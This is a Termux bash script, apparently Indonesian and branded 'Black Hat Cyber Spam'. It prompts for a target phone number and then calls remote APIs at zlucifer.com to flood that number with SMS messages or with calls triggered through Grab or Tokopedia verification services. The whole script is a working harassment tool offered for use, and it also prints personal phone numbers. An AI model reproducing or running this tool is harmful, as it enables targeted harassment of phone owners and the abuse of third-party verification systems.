#!/data/data/com.termux/files/usr/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
troll(){
    clear
    sleep 0.03
    echo "         _ "
    sleep 0.03
    echo "        /_)  _.-===-._ "
    sleep 0.03
    echo "       /  .; '_-.'- .'.     _ "
    sleep 0.03
    echo "  __ _/  /.'\ ._  '. , \   (_\ "
    sleep 0.03
    echo " /\_( \  |.'.-._'- .  '|     \ "
    sleep 0.03
    echo " |_)  /  |/'    ''--''\|     _\__ "
    sleep 0.03
    echo " \_)_|  /'  ___   ___  '\   / )(_\ "
    sleep 0.03
    echo " )/  (  \_     __      _/   \' (_| "
    sleep 0.03
    echo " /   /    \           /     _) (_/ "
    sleep 0.03
    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
    sleep 0.03
    echo " \    /  \ \  '''''  / / /     /   \ "
    sleep 0.03
    echo "  \_.'    \ \       / /  |   .' "
    sleep 0.03
    echo "   '--.,   \ \     / /  _;-'' "
    sleep 0.03
    echo "       '|   \ \   / /   | "
    sleep 0.03
    echo "       .;----'''''''----;. "
    sleep 0.03
    echo "      /(                 )\ "
    sleep 0.03
    echo "      \_''-------------''_/ "
    sleep 0.03
    echo "      | '';-----;-----;'' | "
    sleep 0.03
    echo "      | / : \ / : \ / : \ | "
    sleep 0.03
    echo "      |V.','.V.','.V.','.V| "
    sleep 0.03
    echo "      \'./_\.;./_\.;./_\.'/ "
    sleep 0.03
    echo "       ';..___________..;' "
    sleep 0.03
    echo " ============================="
    sleep 2
    echo " ==  Black Hat Cyber Spam   =="
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "Gunakan Spam lagi cuk?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih sudah Pakai tools ini yak:)"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Call"
    echo "[3] EXIT"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Tools Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh:081289358949]
            read target # masukin no telp
            echo
            echo "Berapa sms yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan Mau Lu Spam "$paket" sudah benar cuk?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS Ke No $target
                    echo
                    echo "Jangan close/Exit Apk Sampai Spam nya beres cuk"
                    echo "==============================================="
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Alhamdulilah Spam nya selesai cuk"
                    echo
                    echo " Makasih dah pakai tools ini"
                    echo " -@Mryans|Wa(0895613141995) "
                    echo "==========================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 081289358949
            read target # masukin no telp
            echo
            echo "Gunakan Spam Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar cuk?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call Ke No  $target
                  echo
                  echo "Jangan Close/Exit Apk sampai Spam nya selesai"
                  echo "============================================="
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Terimakasih & Gunakan Dengan bijak:V"
                  echo
                  echo " Thanks ya "
                  echo " @Mryans¦< Contact(0895613141995)"
                  echo "==========================================="
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan Tools spam Call"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading...."
load
clear
troll
echo Assalamualaikum,Siapa Nama kamu? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ":)"
echo
echo "Mulai Spam?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
